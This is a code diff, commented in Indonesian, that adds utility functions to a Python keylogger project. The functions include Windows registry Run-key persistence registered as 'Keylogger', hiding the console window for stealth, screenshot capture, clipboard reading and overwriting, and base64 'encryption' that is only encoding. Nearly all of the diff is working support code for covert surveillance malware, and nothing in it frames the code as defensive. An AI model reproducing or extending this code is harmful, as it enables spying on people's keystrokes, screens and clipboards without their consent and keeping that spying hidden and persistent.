@@ -1,7 +1,124 @@
-# keylogger/utils.py
 import os
 import datetime
+import base64  # contoh untuk encryption
 
+# ========== Fungsi display ==========
+def display(message=None, style=None):
+    """Fungsi umum untuk menampilkan pesan dengan gaya"""
+    if message:
+        if style == "word":
+            print(f"\033[1;36m[WORD]\033[0m {message}")
+        elif style == "key":
+            print(f"\033[1;32m[{datetime.datetime.now().strftime('%H:%M:%S')}]\033[0m {message}")
+        else:
+            print(message)
+
+# ========== Fungsi encryption ==========
+def encrypt(text, key=None):
+    """Enkripsi sederhana (contoh base64)"""
+    if not key:
+        return base64.b64encode(text.encode()).decode()
+    else:
+        # implementasi enkripsi lain
+        return text
+
+def decrypt(text, key=None):
+    """Dekripsi sederhana"""
+    try:
+        return base64.b64decode(text.encode()).decode()
+    except:
+        return text
+
+# ========== Fungsi persistence ==========
+def add_to_startup(script_path):
+    """Menambahkan script ke startup (contoh untuk Windows)"""
+    if os.name == 'nt':
+        import winreg
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        try:
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                winreg.SetValueEx(regkey, "Keylogger", 0, winreg.REG_SZ, script_path)
+            return True
+        except:
+            return False
+    else:
+        # Untuk Linux, bisa tambahkan ke crontab
+        return False
+
+def remove_from_startup():
+    """Menghapus dari startup"""
+    if os.name == 'nt':
+        import winreg
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        try:
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                winreg.DeleteValue(regkey, "Keylogger")
+            return True
+        except:
+            return False
+    else:
+        return False
+
+# ========== Fungsi stealth ==========
+def hide_console():
+    """Menyembunyikan console Windows"""
+    if os.name == 'nt':
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def show_console():
+    """Menampilkan console Windows"""
+    if os.name == 'nt':
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+
+# ========== Fungsi screenshot ==========
+def take_screenshot(filename="screenshot.png"):
+    """Mengambil screenshot (membutuhkan library PIL/pyscreenshot)"""
+    try:
+        import pyscreenshot as ImageGrab
+        screenshot = ImageGrab.grab()
+        screenshot.save(filename)
+        return filename
+    except ImportError:
+        # Alternatif dengan PIL
+        try:
+            from PIL import ImageGrab
+            screenshot = ImageGrab.grab()
+            screenshot.save(filename)
+            return filename
+        except:
+            return None
+
+# ========== Fungsi clipboard ==========
+def get_clipboard():
+    """Mendapatkan isi clipboard"""
+    try:
+        import pyperclip
+        return pyperclip.paste()
+    except ImportError:
+        try:
+            # Alternatif untuk Windows
+            import ctypes
+            ctypes.windll.user32.OpenClipboard(0)
+            data = ctypes.windll.user32.GetClipboardData(1)
+            ctypes.windll.user32.CloseClipboard()
+            return data if data else ""
+        except:
+            return ""
+
+def set_clipboard(text):
+    """Mengatur isi clipboard"""
+    try:
+        import pyperclip
+        pyperclip.copy(text)
+        return True
+    except:
+        return False
+
+# ========== Fungsi lama (untuk kompatibilitas) ==========
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
